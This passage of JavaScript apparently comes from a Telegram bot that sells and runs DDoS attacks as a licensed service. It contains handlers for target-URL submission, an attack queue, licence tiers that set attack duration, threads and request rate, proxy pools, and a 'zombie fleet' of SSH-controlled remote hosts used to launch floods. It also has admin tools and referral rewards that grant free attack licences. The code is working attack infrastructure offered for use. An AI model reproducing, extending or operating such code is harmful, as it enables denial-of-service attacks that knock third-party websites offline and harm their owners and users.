        return bot.sendMessage(chatId, `⚡ Max threads (1-${CONFIG.HARD_MAX_THREADS}):`, { reply_markup: tierKeyboard('threads') });
    }

    if (st.step === 'adm_lic_threads') {
        if (!isAdmin(userId)) return;
        const t = parseInt(msg.text.trim());
        if (!t || t < 1 || t > CONFIG.HARD_MAX_THREADS) return bot.sendMessage(chatId, `❌ 1-${CONFIG.HARD_MAX_THREADS}.`);
        st.data.maxThreads = t; st.step = 'adm_lic_rate';
        return bot.sendMessage(chatId, `🚀 Max rate (1-${CONFIG.HARD_MAX_RATE}):`, { reply_markup: tierKeyboard('rate') });
    }

    if (st.step === 'adm_lic_rate') {
        if (!isAdmin(userId)) return;
        const r = parseInt(msg.text.trim());
        if (!r || r < 1 || r > CONFIG.HARD_MAX_RATE) return bot.sendMessage(chatId, `❌ 1-${CONFIG.HARD_MAX_RATE}.`);
        st.data.maxRate = r; st.step = 'adm_lic_zombies';
        return bot.sendMessage(chatId, '🧟 Max zombies this license can use:', { reply_markup: tierKeyboard('zombies') });
    }

    // ---- Broadcast ----
    if (st.step === 'adm_broadcast') {
        if (!isAdmin(userId)) return;
        let ok = 0, fail = 0;
        for (const id of Object.keys(users)) {
            try { await bot.sendMessage(id, `📢 *Admin broadcast*\n\n${msg.text}`, { parse_mode: 'Markdown' }); ok++; }
            catch { fail++; }
        }
        userState.delete(chatId);
        return bot.sendMessage(chatId, `📢 ✅ ${ok} | ❌ ${fail}`);
    }

    // ---- proxies paste ----
    if (st.step === 'adm_proxies') {
        if (!isAdmin(userId)) return;
        const lines = parseProxyLines(msg.text);
        if (!lines.length) return bot.sendMessage(chatId, '❌ No valid proxies. Format: `host:port`', { parse_mode: 'Markdown' });
        const result = mergeProxies(lines, st.data.mode || 'add');
        userState.delete(chatId);
        return bot.sendMessage(chatId,
            `✅ Proxies: submitted ${result.submitted}, added ${result.added}, total *${result.total}*`,
            { parse_mode: 'Markdown', reply_markup: adminMenuKeyboard() });
    }

    // ---- ban/unban/reset admin ----
    if (st.step === 'adm_ban' || st.step === 'adm_unban') {
        if (!isAdmin(userId)) return;
        const tgt = parseInt(msg.text.trim());
        if (!users[tgt]) return bot.sendMessage(chatId, '❌ Not found.');
        users[tgt].banned = st.step === 'adm_ban';
        saveJSON(FILES.users, users);
        userState.delete(chatId);
        return bot.sendMessage(chatId, `✅ \`${tgt}\` ${st.step === 'adm_ban' ? 'banned' : 'unbanned'}.`, { parse_mode: 'Markdown' });
    }

    if (st.step === 'adm_reset_cd') {
        if (!isAdmin(userId)) return;
        const tgt = parseInt(msg.text.trim());
        if (!users[tgt]) return bot.sendMessage(chatId, '❌ Not found.');
        users[tgt].lastAttackAt = 0;
        users[tgt].daily = { date: todayStr(), count: 0 };
        saveJSON(FILES.users, users);
        userState.delete(chatId);
        return bot.sendMessage(chatId, `♻️ Reset for \`${tgt}\`.`, { parse_mode: 'Markdown' });
    }

    if (st.step === 'adm_add_admin' || st.step === 'adm_rm_admin') {
        if (!isOwner(userId)) return bot.sendMessage(chatId, '❌ Owner only.');
        const tgt = parseInt(msg.text.trim());
        if (!tgt) return;
        if (st.step === 'adm_add_admin') { if (!admins.includes(tgt)) admins.push(tgt); }
        else { admins = admins.filter(a => a !== tgt); }
        saveJSON(FILES.admins, admins);
        userState.delete(chatId);
        return bot.sendMessage(chatId, `✅ Admin \`${tgt}\` ${st.step === 'adm_add_admin' ? 'added' : 'removed'}.`, { parse_mode: 'Markdown' });
    }

    // ---- edit license ----
    if (st.step === 'adm_edit_license_key') {
        if (!isAdmin(userId)) return;
        const key = msg.text.trim().toUpperCase();
        if (!licenses[key]) {
            userState.delete(chatId);
            return bot.sendMessage(chatId, '❌ Not found.', { reply_markup: adminMenuKeyboard() });
        }
        st.data.key = key; st.step = 'adm_edit_license_menu';
        return sendLicenseEditMenu(chatId, key);
    }

    if (st.step === 'adm_edit_value') {
        if (!isAdmin(userId)) return;
        const key = st.data.key, field = st.data.field;
        const lic = licenses[key];
        if (!lic) { userState.delete(chatId); return bot.sendMessage(chatId, '❌ Gone.'); }
        const val = parseInt(msg.text.trim());
        if (isNaN(val)) return bot.sendMessage(chatId, '❌ Number.');

        let ok = true, err = '';
        switch (field) {
            case 'days':       if (val < 1 || val > 3650) { ok = false; err = '1-3650'; } else lic.durationDays = val; break;
            case 'uses':       if (val < 1 || val > 99999) { ok = false; err = '1-99999'; } else lic.maxUses = val === 9999 ? 9999 : val; break;
            case 'daily':      if (val < 1 || val > 1000) { ok = false; err = '1-1000'; } else lic.dailyLimit = val; break;
            case 'cooldown':   if (val < 0 || val > 86400) { ok = false; err = '0-86400'; } else lic.cooldownSeconds = val; break;
            case 'concurrent': if (val < 1 || val > 10) { ok = false; err = '1-10'; } else lic.maxConcurrent = val; break;
            case 'atkdur':     if (val < 1 || val > CONFIG.MAX_ATTACK_DURATION) { ok = false; err = `1-${CONFIG.MAX_ATTACK_DURATION}`; } else lic.maxAttackDuration = val; break;
            case 'threads':    if (val < 1 || val > CONFIG.HARD_MAX_THREADS) { ok = false; err = `1-${CONFIG.HARD_MAX_THREADS}`; } else lic.maxThreads = val; break;
            case 'rate':       if (val < 1 || val > CONFIG.HARD_MAX_RATE) { ok = false; err = `1-${CONFIG.HARD_MAX_RATE}`; } else lic.maxRate = val; break;
            case 'zombies':    if (val < -1 || val > 100) { ok = false; err = '-1 (all), 0 (local), 1-100'; } else lic.maxZombies = val; break;
            default:           ok = false; err = 'unknown';
        }
        if (!ok) return bot.sendMessage(chatId, `❌ ${err}. Send again:`);
        saveJSON(FILES.licenses, licenses);
        st.step = 'adm_edit_license_menu';
        return sendLicenseEditMenu(chatId, key, `✅ ${field} → ${val}`);
    }
});

function sendLicenseEditMenu(chatId, key, header = '') {
    const lic = licenses[key];
    if (!lic) return bot.sendMessage(chatId, '❌ Not found.', { reply_markup: adminMenuKeyboard() });
    const z = licMaxZombies(lic);
    const txt = (header ? header + '\n\n' : '') +
        `✏️ *Editing License*\n\n🔑 \`${key}\`\n\n` +
        `📅 Days: ${lic.durationDays}\n` +
        `👥 Uses: ${lic.usedCount}/${lic.maxUses === 9999 ? '∞' : lic.maxUses}\n` +
        `📊 Daily: ${lic.dailyLimit ?? 5}\n` +
        `⏳ CD: ${lic.cooldownSeconds ?? 60}s\n` +
        `🧵 Conc: ${lic.maxConcurrent ?? 1}\n` +
        `⏱ Dur: ${licMaxAttackDuration(lic)}s\n` +
        `⚡ Threads: ${licMaxThreads(lic)}\n` +
        `🚀 Rate: ${licMaxRate(lic)}\n` +
        `🧟 Zombies: ${z === -1 ? 'all' : z}\n\n` +
        `Pick a field:`;
    return bot.sendMessage(chatId, txt, { parse_mode: 'Markdown', reply_markup: editLicenseKeyboard(key) });
}

// =============================================================
//  CALLBACK HANDLER
// =============================================================
bot.on('callback_query', async (q) => {
    const chatId = q.message.chat.id;
    const userId = q.from.id;
    const msgId  = q.message.message_id;
    const data   = q.data;

    const ans  = t => bot.answerCallbackQuery(q.id, { text: t }).catch(() => {});
    const edit = (t, kb) => bot.editMessageText(t, {
        chat_id: chatId, message_id: msgId, parse_mode: 'Markdown', reply_markup: kb,
    }).catch(() => {});

    // force-join verify
    if (data === 'fj_verify') {
        clearMemberCacheFor(userId);
        const res = await checkMembership(userId);
        if (!res.ok) {
            return bot.answerCallbackQuery(q.id, {
                text: `❌ Still missing: ${res.missing.map(c => c.title || c.id).join(', ')}`,
                show_alert: true,
            }).catch(() => {});
        }
        await bot.answerCallbackQuery(q.id, { text: '✅ Verified!' }).catch(() => {});
        await bot.deleteMessage(chatId, msgId).catch(() => {});
        return showMainPanel(chatId, userId, q.from.first_name);
    }

    // referral
    if (data === 'ref_menu') {
        const uname = await getBotUsername();
        if (!uname) return ans('⚠️ Not ready');
        const ref = getReferral(userId);
        const link = `https://t.me/${uname}?start=ref_${userId}`;
        const count = ref.count || 0;
        const filled = Math.min(count, CONFIG.REFERRAL_TARGET);
        const bar = '█'.repeat(filled) + '░'.repeat(Math.max(0, CONFIG.REFERRAL_TARGET - filled));
        return edit(
            `🎁 *Invite & Earn*\n\n\`${link}\`\n\nProgress: ${bar} *${count}/${CONFIG.REFERRAL_TARGET}*\n\n` +
            `🎁 Reward: ${CONFIG.REFERRAL_TARGET} invites = FREE license\n` +
            `📅 ${REFERRAL_REWARD.durationDays}d | 📊 ${REFERRAL_REWARD.dailyLimit}/day | ⏳ ${REFERRAL_REWARD.cooldownSeconds}s\n` +
            `⚡ ${REFERRAL_REWARD.maxThreads}t | 🚀 ${REFERRAL_REWARD.maxRate}r\n\n` +
            (ref.rewardedAt ? `✅ Claimed: \`${ref.rewardKey}\`` : (count >= CONFIG.REFERRAL_TARGET ? '⚠️ Threshold reached, pending.' : 'Share the link — every new user counts.')),
            mainMenuKeyboard(userId)
        );
    }

    // main menu
    if (data === 'menu_attack') {
        if (!isLicensed(userId)) return ans('❌ No license');
        const join = await checkMembership(userId);
        if (!join.ok) { await sendJoinPrompt(chatId, join.missing); return ans('🔒 Join'); }
        userState.set(chatId, { step: 'attack_target', data: {} });
        const queueLock = Math.max(0, Math.ceil((queueLockedUntil - now()) / 1000));
        const activeNote = activeAttacks.size > 0
            ? `\n\n⚠️ *Note:* Attack active. Your attack will be queued (${CONFIG.QUEUE_GAP_MS/1000}s gap).`
            : (queueLock > 0 ? `\n\n⚠️ *Note:* Queue cooldown ${queueLock}s — your attack will be queued.` : '');
        return edit(`🎯 *New Attack*\n\n🔗 Send target URL:${activeNote}`, null);
    }

    if (data === 'menu_active') {
        const list = [...activeAttacks.values()].filter(a => a.userId === userId);
        if (!list.length) return ans('📭 None');
        const kb = { inline_keyboard: [] };
        let txt = '📊 *Active*\n\n';
        for (const a of list) {
            const rem = Math.max(0, Math.floor((a.endTime - now()) / 1000));
            const icon = a.type === 'zombie' ? `🧟×${a.children.length}` : '💻';
            txt += `#${a.id} ${icon} \`${a.target}\` — ${rem}s\n`;
            kb.inline_keyboard.push([{ text: `🛑 Stop #${a.id}`, callback_data: `stop_${a.id}` }]);
        }
        return edit(txt, kb);
    }

    if (data === 'menu_queue') {
        const queueLock = Math.max(0, Math.ceil((queueLockedUntil - now()) / 1000));
        let txt = '📋 *Attack Queue*\n\n';
        if (activeAttacks.size > 0) {
            const a = [...activeAttacks.values()][0];
            const rem = Math.max(0, Math.ceil((a.endTime - now()) / 1000));
            txt += `🔴 *Active:* #${a.id} → \`${a.target}\` (${rem}s)\n\n`;
        } else {
            txt += `🟢 *Active:* none\n\n`;
        }
        if (queueLock > 0) txt += `🔒 *Cooldown:* ${queueLock}s\n\n`;
        if (!attackQueue.length) {
            txt += `📭 Queue empty`;
        } else {
            txt += `⏳ *Queued:* ${attackQueue.length}\n\n`;
            attackQueue.slice(0, 15).forEach((qq, i) => {
                const mine = qq.userId === userId ? ' ⬅️' : '';
                txt += `${i + 1}. \`${qq.target}\` — ${qq.duration}s${mine}\n`;
            });
            if (attackQueue.length > 15) txt += `... +${attackQueue.length - 15} more\n`;
        }
        return edit(txt, mainMenuKeyboard(userId));
    }

    if (data === 'menu_license') {
        const u = getUser(userId), lic = getLicenseForUser(userId);
        resetDailyIfNeeded(u);
        const cdRemain = Math.max(0, Math.ceil((u.lastAttackAt + (lic?.cooldownSeconds ?? 60)*1000 - now()) / 1000));
        const z = licMaxZombies(lic);
        return edit(
            `🔑 *License Info*\n\n🆔 \`${userId}\`\n📝 \`${u.licenseKey || '—'}\`\n` +
            `📅 ${fmtDate(u.activatedAt)} → ${fmtDate(u.expiresAt)}\n\n` +
            `📊 ${u.daily.count}/${lic?.dailyLimit ?? 5} | ⏳ ${lic?.cooldownSeconds ?? 60}s ${cdRemain > 0 ? `(${cdRemain}s)` : '✅'}\n` +
            `🧵 ${lic?.maxConcurrent ?? 1} | ⏱ ${licMaxAttackDuration(lic)}s | ⚡ ${licMaxThreads(lic)}t | 🚀 ${licMaxRate(lic)}r\n` +
            `🧟 Zombies: ${z === -1 ? 'all' : (z === 0 ? 'local' : z)}\n` +
            `🔥 Total: ${u.totalAttacks || 0}`,
            mainMenuKeyboard(userId));
    }

    if (data === 'menu_admin' && isAdmin(userId)) return edit('🛡 *Admin Panel*', adminMenuKeyboard());

    // attack options
    if (data.startsWith('opt_')) {
        const st = userState.get(chatId);
        if (!st || st.step !== 'attack_options') return ans('Session expired');
        const o = st.data.options;
        if (data === 'opt_cookies')  { o.cookies = !o.cookies; return edit('🔧 Options:', attackOptionsKeyboard(st.data)); }
        if (data === 'opt_headfull') { o.headfull = !o.headfull; return edit('🔧 Options:', attackOptionsKeyboard(st.data)); }
        if (data === 'opt_cache')    { o.cache = !o.cache; return edit('🔧 Options:', attackOptionsKeyboard(st.data)); }
        if (data === 'opt_silent')   { o.silent = !o.silent; return edit('🔧 Options:', attackOptionsKeyboard(st.data)); }
        if (data === 'opt_version')  { o.version = o.version === '2' ? '1' : '2'; return edit('🔧 Options:', attackOptionsKeyboard(st.data)); }
        if (data === 'opt_cancel')   { userState.delete(chatId); return edit('❌ Cancelled.', null); }
        if (data === 'opt_confirm') {
            const { target, duration, threads, rate, options } = st.data;
            const join = await checkMembership(userId);
            if (!join.ok) { await sendJoinPrompt(chatId, join.missing); return ans('🔒 Join'); }
            userState.delete(chatId);
            dispatchAttack(chatId, userId, target, duration, threads, rate, options, t => edit(t));
            return ans('🚀');
        }
    }

    if (data === 'def_threads') {
        const st = userState.get(chatId);
        if (!st) return ans('Expired');
        const lic = getLicenseForUser(userId);
        st.data.threads = Math.min(20, licMaxThreads(lic));
        st.step = 'attack_rate';
        const maxRt = licMaxRate(lic);
        return edit(`⚡ Rate (1-${maxRt}):`, { inline_keyboard: [[{ text: `Default (${Math.min(64, maxRt)})`, callback_data: 'def_rate' }]] });
    }
    if (data === 'def_rate') {
        const st = userState.get(chatId);
        if (!st) return ans('Expired');
        const lic = getLicenseForUser(userId);
        st.data.rate = Math.min(64, licMaxRate(lic));
        st.data.options = { cookies: false, headfull: true, cache: true, silent: true, version: '2' };
        st.step = 'attack_options';
        return edit('🔧 Options:', attackOptionsKeyboard(st.data));
    }

    // stop attack
    if (data.startsWith('stop_')) {
        const id = parseInt(data.slice(5));
        const a = activeAttacks.get(id);
        if (!a) return ans('Not found');
        if (a.userId !== userId && !isAdmin(userId)) return ans('No perm');
        try {
            if (a.type === 'zombie' && a.children) {
                for (const c of a.children) {
                    try { c.stream.signal('KILL'); } catch {}
                    try { c.conn.end(); } catch {}
                }
            } else if (a.proc) {
                a.proc.kill('SIGKILL');
            }
        } catch {}
        return ans(`🛑 Stopped #${id}`);
    }

    if (!isAdmin(userId)) return ans('No perm');

    // ---- ZOMBIE MENU ----
    if (data === 'z_menu') {
        const online = activeZombies().length;
        const kb = { inline_keyboard: [] };
        if (zombies.length) {
            for (const z of zombies.slice(0, 15)) {
                const icon = z.status === 'online' ? '🟢' : '🔴';
                kb.inline_keyboard.push([
                    { text: `${icon} ${z.host}:${z.port}`, callback_data: `z_info_${z.id}` },
                    { text: '🗑', callback_data: `z_del_${z.id}` },
                ]);
            }
        }
        kb.inline_keyboard.push([{ text: '➕ Add Zombie', callback_data: 'z_add' }]);
        kb.inline_keyboard.push([{ text: '🔄 Check All', callback_data: 'z_checkall' }]);
        kb.inline_keyboard.push([{ text: '↩️ Back', callback_data: 'menu_admin' }]);
        return edit(
            `🧟 *Zombie Fleet*\n\nOnline: *${online}/${zombies.length}*\n\n` +
            (zombies.length ? '' : `No zombies yet.`),
            kb);
    }

    if (data === 'z_add') {
        userState.set(chatId, { step: 'z_host', data: {} });
        return edit(`➕ *Add Zombie*\n\nStep 1/3 — Send \`host:port\`\nExample: \`135.181.61.243:22\``, null);
    }

    if (data.startsWith('z_del_')) {
        const id = data.slice('z_del_'.length);
        const before = zombies.length;
        zombies = zombies.filter(z => z.id !== id);
        saveJSON(FILES.zombies, zombies);
        return ans(`🗑 Removed (${before - zombies.length})`);
    }

    if (data.startsWith('z_info_')) {
        const id = data.slice('z_info_'.length);
        const z = zombies.find(x => x.id === id);
        if (!z) return ans('Not found');
        const icon = z.status === 'online' ? '🟢' : '🔴';
        return edit(
            `${icon} *Zombie*\n\n` +
            `🆔 \`${z.id}\`\n🌐 \`${z.host}:${z.port}\`\n👤 \`${z.username}\`\n` +
            `📦 Node.js ${z.nodeVersion || '?'}\n` +
            `🟢 Status: *${z.status}*\n` +
            `⏱ Last check: ${fmtDate(z.lastCheck)}\n` +
            `📅 Added: ${fmtDate(z.addedAt)}`,
            { inline_keyboard: [
                [{ text: '🔄 Test', callback_data: `z_test_${z.id}` }],
                [{ text: '🗑 Delete', callback_data: `z_del_${z.id}` }],
                [{ text: '↩️ Back', callback_data: 'z_menu' }],
            ]});
    }

    if (data.startsWith('z_test_')) {
        const id = data.slice('z_test_'.length);
        const z = zombies.find(x => x.id === id);
        if (!z) return ans('Not found');
        ans('⏳ Testing...');
        (async () => {
            try {
                const conn = await sshConnect(z, 8000);
                const r = await sshExec(conn, 'command -v node && node -v');
                conn.end();
                if (r.code === 0 && r.stdout.includes('v')) {
                    z.status = 'online';
                    z.nodeVersion = r.stdout.trim().split('\n').pop();
                    saveJSON(FILES.zombies, zombies);
                    return bot.sendMessage(chatId, `✅ ${z.host} online — Node ${z.nodeVersion}`).catch(() => {});
                }
            } catch {}
            z.status = 'offline';
            z.lastCheck = now();
            saveJSON(FILES.zombies, zombies);
            return bot.sendMessage(chatId, `❌ ${z.host} offline`).catch(() => {});
        })();
        return;
    }

    if (data === 'z_checkall') {
        ans('🔄 Checking...');
        (async () => {
            for (const z of zombies) {
                try {
                    const conn = await sshConnect(z, 8000);
                    const r = await sshExec(conn, 'command -v node && node -v');
                    conn.end();
                    if (r.code === 0 && r.stdout.includes('v')) {
                        z.status = 'online';
                        z.nodeVersion = r.stdout.trim().split('\n').pop();
                    } else { z.status = 'offline'; }
                } catch { z.status = 'offline'; }
                z.lastCheck = now();
            }
            saveJSON(FILES.zombies, zombies);
            bot.sendMessage(chatId,
                `✅ Checked. Online: ${activeZombies().length}/${zombies.length}`,
                { reply_markup: adminMenuKeyboard() }).catch(() => {});
        })();
        return;
    }

    // ---- BLACKLIST MENU ----
    if (data === 'bl_menu') {
        const kb = { inline_keyboard: [] };
        for (const b of blacklist.slice(0, 25)) {
            kb.inline_keyboard.push([{ text: `🗑 ${b}`, callback_data: `bl_rm_${Buffer.from(b).toString('hex')}` }]);
        }
        kb.inline_keyboard.push([{ text: '➕ Add Pattern', callback_data: 'bl_add' }]);
        kb.inline_keyboard.push([{ text: '↩️ Back', callback_data: 'menu_admin' }]);
        return edit(
            `⛔ *Blacklist*\n\nCount: *${blacklist.length}*\n\n` +
            (blacklist.length
                ? blacklist.slice(0, 25).map(b => `• \`${esc(b)}\``).join('\n') + (blacklist.length > 25 ? `\n... +${blacklist.length - 25}` : '')
                : `No patterns — all targets allowed.`) +
            `\n\n*Formats:* \`example.com\`, \`.ir\`, \`*.gov\``,
            kb);
    }

    if (data === 'bl_add') {
        userState.set(chatId, { step: 'bl_add', data: {} });
        return edit(
            `➕ *Add Blacklist Pattern*\n\nSend pattern:\n` +
            `• \`example.com\` — exact + subdomains\n` +
            `• \`.ir\` — all *.ir\n` +
            `• \`*.gov\` — all *.gov`,
            null);
    }

    if (data.startsWith('bl_rm_')) {
        const hex = data.slice('bl_rm_'.length);
        try {
            const pat = Buffer.from(hex, 'hex').toString();
            const before = blacklist.length;
            blacklist = blacklist.filter(b => b !== pat);
            saveJSON(FILES.blacklist, blacklist);
            return ans(`🗑 Removed (${before - blacklist.length})`);
        } catch { return ans('Invalid'); }
    }

    // ---- admin actions ----
    if (data === 'adm_stats') {
        return edit(
            `📊 *Bot Stats*\n\n` +
            `👥 Users: ${Object.keys(users).length}\n` +
            `🔑 Licenses: ${Object.keys(licenses).length}\n` +
            `🧟 Zombies: ${activeZombies().length}/${zombies.length} online\n` +
            `⛔ Blacklist: ${blacklist.length}\n` +
            `📢 Force-join: ${loadJSON(FILES.channels, []).length}\n` +
            `🎁 Referrals: ${Object.keys(referrals).length}\n` +
            `⚡ Active: ${activeAttacks.size}/${CONFIG.MAX_CONCURRENT_ATTACKS}\n` +
            `⏳ Queue: ${attackQueue.length}/${CONFIG.MAX_QUEUE_SIZE}\n` +
            `🔒 Queue cooldown: ${Math.max(0, Math.ceil((queueLockedUntil - now()) / 1000))}s\n` +
            `⏱ Gap: ${CONFIG.QUEUE_GAP_MS/1000}s\n` +
            `🔥 Total: ${stats.totalAttacks}\n` +
            `💾 RAM: ${Math.round(process.memoryUsage().rss / 1048576)}MB / free ${freeMemMB()}MB\n` +
            `⏱ Uptime: ${Math.floor(process.uptime() / 60)}m`,
            adminMenuKeyboard());
    }

    if (data === 'adm_pool') {
        let txt = `🏊 *Pool Status*\n\n`;
        txt += `Active: ${activeAttacks.size}/${CONFIG.MAX_CONCURRENT_ATTACKS}\n`;
        txt += `Queue: ${attackQueue.length}/${CONFIG.MAX_QUEUE_SIZE}\n`;
        txt += `Queue cooldown: ${Math.max(0, Math.ceil((queueLockedUntil - now()) / 1000))}s\n`;
        txt += `Gap: ${CONFIG.QUEUE_GAP_MS/1000}s\n`;
        txt += `Free RAM: ${freeMemMB()}MB\n\n`;
        if (activeAttacks.size > 0) {
            const a = [...activeAttacks.values()][0];
            const rem = Math.max(0, Math.ceil((a.endTime - now()) / 1000));
            txt += `🔴 #${a.id} \`${a.target}\` (${rem}s)\n`;
        }
        return edit(txt, adminMenuKeyboard());
    }

    if (data === 'adm_queue') {
        let txt = '📋 *Full Queue*\n\n';
        if (!attackQueue.length) {
            txt += 'Empty.';
        } else {
            txt += `Total: ${attackQueue.length}/${CONFIG.MAX_QUEUE_SIZE}\n\n`;
            attackQueue.slice(0, 30).forEach((q, i) => {
                const u = getUser(q.userId);
                txt += `${i + 1}. \`${q.target}\` — ${q.duration}s — ${esc(u.username || u.firstName || q.userId)}\n`;
            });
            if (attackQueue.length > 30) txt += `... +${attackQueue.length - 30} more\n`;
        }
        return edit(txt, adminMenuKeyboard());
    }

    if (data === 'adm_users') {
        const ids = Object.keys(users);
        if (!ids.length) return edit('No users.', adminMenuKeyboard());
        let txt = '👥 *Users (last 25)*\n\n';
        ids.slice(-25).forEach(id => {
            const u = users[id];
            const st = u.banned ? '🚫' : (isLicensed(id) ? '✅' : '❌');
            resetDailyIfNeeded(u);
            txt += `${st} \`${id}\` ${u.username ? '@' + esc(u.username) : esc(u.firstName || '')} — ${u.daily?.count ?? 0}\n`;
        });
        return edit(txt, adminMenuKeyboard());
    }

    if (data === 'adm_gen_license') {
        userState.set(chatId, { step: 'adm_lic_days', data: {} });
        return edit('📅 Duration (days):', null);
    }

    if (data === 'adm_licenses') {
        const keys = Object.keys(licenses);
        if (!keys.length) return edit('No licenses.', adminMenuKeyboard());
        let txt = '📋 *Licenses (last 10)*\n\n';
        keys.slice(-10).forEach(k => {
            const l = licenses[k];
            const badge = l.isReferralReward ? '🎁 ' : '';
            const z = licMaxZombies(l);
            txt += `${badge}\`${k}\`\n` +
                   `📅 ${l.durationDays}d | 👥 ${l.usedCount}/${l.maxUses === 9999 ? '∞' : l.maxUses} | 📊 ${l.dailyLimit ?? 5}/day\n` +
                   `🧟 ${z === -1 ? 'all' : z} | ⚡ ${licMaxThreads(l)}t | 🚀 ${licMaxRate(l)}r\n\n`;
        });
        return edit(txt, adminMenuKeyboard());
    }

    if (data === 'adm_stop_all') {
        let n = 0;
        for (const a of activeAttacks.values()) {
            try {
                if (a.type === 'zombie' && a.children) {
                    for (const c of a.children) { try { c.stream.signal('KILL'); } catch {} try { c.conn.end(); } catch {} }
                } else if (a.proc) { a.proc.kill('SIGKILL'); }
                n++;
            } catch {}
        }
        return ans(`🛑 Stopped ${n}`);
    }

    if (data === 'adm_clear_queue') {
        const n = attackQueue.length;
        attackQueue.length = 0;
        return ans(`🗑 Cleared ${n} queued attacks.`);
    }

    if (data === 'adm_proxies_add') {
        userState.set(chatId, { step: 'adm_proxies', data: { mode: 'add' } });
        return edit('➕ *Add Proxies*\n\nSend `host:port` lines or .txt file.', null);
    }
    if (data === 'adm_proxies_replace') {
        userState.set(chatId, { step: 'adm_proxies', data: { mode: 'replace' } });
        return edit('♻️ *Replace Proxies*\n\n⚠️ Wipes pool. Send .txt or text.', null);
    }

    if (data === 'adm_proxies_count') {
        let count = 0, size = 0;
        try {
            const raw = fs.readFileSync(FILES.proxies, 'utf8');
            count = raw.split('\n').map(l => l.trim()).filter(Boolean).length;
            size = Buffer.byteLength(raw);
        } catch {}
        return edit(`📈 Proxies: *${count}* (${(size/1024).toFixed(2)} KB)`, adminMenuKeyboard());
    }

    if (data === 'adm_proxies_scrape') {
        const scriptPath = path.join(__dirname, CONFIG.SCRIPT_PATH);
        if (!fs.existsSync(scriptPath)) return ans('c-rush.js missing');
        const proc = spawn('node', [CONFIG.SCRIPT_PATH, 'scrape'], { cwd: __dirname, stdio: 'ignore' });
        proc.on('exit', code => {
            bot.sendMessage(chatId, code === 0 ? '✅ Scrape done.' : `⚠️ exit ${code}`,
                { reply_markup: adminMenuKeyboard() }).catch(() => {});
        });
        return ans('🌐 Scraping...');
    }

    if (data === 'adm_broadcast') {
        userState.set(chatId, { step: 'adm_broadcast', data: {} });
        return edit('📢 Send broadcast:', null);
    }

    if (data === 'adm_ban')       { userState.set(chatId, { step: 'adm_ban', data: {} }); return edit('🚫 User ID:', null); }
    if (data === 'adm_unban')     { userState.set(chatId, { step: 'adm_unban', data: {} }); return edit('✅ User ID:', null); }
    if (data === 'adm_reset_cd')  { userState.set(chatId, { step: 'adm_reset_cd', data: {} }); return edit('♻️ User ID:', null); }
    if (data === 'adm_add_admin') { userState.set(chatId, { step: 'adm_add_admin', data: {} }); return edit('👤 User ID:', null); }
    if (data === 'adm_rm_admin')  { userState.set(chatId, { step: 'adm_rm_admin', data: {} }); return edit('🗑 User ID:', null); }

    if (data === 'adm_edit_license') {
        userState.set(chatId, { step: 'adm_edit_license_key', data: {} });
        return edit('✏️ Send license key:', null);
    }

    if (data === 'fj_menu') {
        const channels = loadJSON(FILES.channels, []);
        const kb = { inline_keyboard: [] };
        for (const ch of channels) kb.inline_keyboard.push([{ text: `🗑 ${ch.title || ch.id}`, callback_data: `fj_rm_${ch.id}` }]);
        kb.inline_keyboard.push([{ text: '➕ Add Channel', callback_data: 'fj_add' }]);
        kb.inline_keyboard.push([{ text: '↩️ Back', callback_data: 'menu_admin' }]);
        return edit(
            `📢 *Force-Join*\n\n` +
            (channels.length ? channels.map(c => `• ${esc(c.title || String(c.id))}`).join('\n') : 'None set.') +
            `\n\nAdd by @username or -100xxx.`,
            kb);
    }

    if (data === 'fj_add') {
        userState.set(chatId, { step: 'adm_fj_add', data: {} });
        return edit('➕ Send @username or -100xxx:', null);
    }

    if (data.startsWith('fj_rm_')) {
        const id = data.slice('fj_rm_'.length);
        let channels = loadJSON(FILES.channels, []);
        channels = channels.filter(c => String(c.id) !== id);
        saveJSON(FILES.channels, channels);
        memberCache.clear(); warnedChannels.clear();
        return ans('🗑 Removed');
    }

    // ---- edit license field ----
    if (data.startsWith('edit_')) {
        const parts = data.split('_');
        const field = parts[1];
        const key = parts.slice(2).join('_');
        if (!licenses[key]) return ans('Not found');

        if (field === 'delete') {
            delete licenses[key];
            for (const [uid, u] of Object.entries(users)) {
                if (u.licenseKey === key) { u.licenseKey = null; u.expiresAt = null; }
            }
            saveJSON(FILES.licenses, licenses);
            saveJSON(FILES.users, users);
            userState.delete(chatId);
            return edit(`🗑 \`${key}\` deleted.`, adminMenuKeyboard());
        }

        const prompts = {
            days: `📅 New days (1-3650):`,
            uses: `👥 New activations (1-99999, 9999=∞):`,
            daily: `📊 New daily (1-1000):`,
            cooldown: `⏳ New CD (0-86400):`,
            concurrent: `🧵 New concurrent (1-10):`,
            atkdur: `⏱ New max dur (1-${CONFIG.MAX_ATTACK_DURATION}):`,
            threads: `⚡ New max threads (1-${CONFIG.HARD_MAX_THREADS}):`,
            rate: `🚀 New max rate (1-${CONFIG.HARD_MAX_RATE}):`,
            zombies: `🧟 New max zombies (-1=all, 0=local, 1-100):`,
        };
        if (!prompts[field]) return ans('Unknown');
        userState.set(chatId, { step: 'adm_edit_value', data: { key, field } });
        return edit(prompts[field], null);
    }

    // ---- license uses ----
    if (data.startsWith('lic_uses_')) {
        const st = userState.get(chatId);
        if (!st || st.step !== 'adm_lic_uses') return ans('Expired');
        st.data.uses = data === 'lic_uses_inf' ? 9999 : parseInt(data.replace('lic_uses_', ''));
        st.step = 'adm_lic_daily';
        return edit('📊 Daily limit (1-1000):', null);
    }

    // ---- tier buttons ----
    if (data.startsWith('tier_atk_')) {
        const st = userState.get(chatId);
        if (!st || st.step !== 'adm_lic_atkdur') return ans('Expired');
        st.data.maxAttackDuration = parseInt(data.replace('tier_atk_', ''));
        st.step = 'adm_lic_threads';
        return edit(`⚡ Max threads (1-${CONFIG.HARD_MAX_THREADS}):`, tierKeyboard('threads'));
    }
    if (data.startsWith('tier_thr_')) {
        const st = userState.get(chatId);
        if (!st || st.step !== 'adm_lic_threads') return ans('Expired');
        st.data.maxThreads = parseInt(data.replace('tier_thr_', ''));
        st.step = 'adm_lic_rate';
        return edit(`🚀 Max rate (1-${CONFIG.HARD_MAX_RATE}):`, tierKeyboard('rate'));
    }
    if (data.startsWith('tier_rate_')) {
        const st = userState.get(chatId);
        if (!st || st.step !== 'adm_lic_rate') return ans('Expired');
        st.data.maxRate = parseInt(data.replace('tier_rate_', ''));
        st.step = 'adm_lic_zombies';
        return edit('🧟 Max zombies:', tierKeyboard('zombies'));
    }
    if (data.startsWith('tier_z_')) {
        const st = userState.get(chatId);
        if (!st || st.step !== 'adm_lic_zombies') return ans('Expired');
